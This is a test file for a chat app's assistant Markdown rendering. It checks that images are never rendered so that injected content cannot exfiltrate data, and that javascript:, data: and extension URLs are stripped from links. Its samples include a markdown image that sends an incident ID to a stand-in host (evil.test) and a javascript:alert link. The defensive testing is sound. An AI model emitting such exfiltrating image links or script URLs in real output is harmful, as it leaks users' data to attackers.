// @vitest-environment jsdom
import { cleanup, render } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import Message from '../components/Message';
import { safeLinkUrl } from '../lib/markdown';

afterEach(cleanup);

const assistant = (text: string) =>
  ({ id: 'm', role: 'assistant', parts: [{ type: 'text', text }] }) as never;

describe('assistant Markdown', () => {
  it('never renders images, so injected content cannot exfiltrate on render', () => {
    const { container } = render(
      <Message message={assistant('Done ![x](https://evil.test/p?d=INC0012345)')} onApproval={() => {}} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.test');
    expect(container.textContent).toContain('[image removed: x]');
  });

  it('keeps http(s) links and drops script URLs', () => {
    const { container } = render(
      <Message
        message={assistant('[job](https://splunk.test/app/search/search?sid=1) and [bad](javascript:alert(1))')}
        onApproval={() => {}}
      />,
    );
    const links = [...container.querySelectorAll('a')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://splunk.test/app/search/search?sid=1']);
    expect(container.textContent).toContain('bad');
  });
});

describe('safeLinkUrl', () => {
  it.each([
    ['https://a.test/x', 'https://a.test/x'],
    ['http://a.test/', 'http://a.test/'],
    ['javascript:alert(1)', ''],
    ['data:text/html,hi', ''],
    ['chrome-extension://abc/options.html', ''],
    ['/relative', ''],
    ['#frag', '#frag'],
  ])('%s', (input, out) => expect(safeLinkUrl(input)).toBe(out));
});
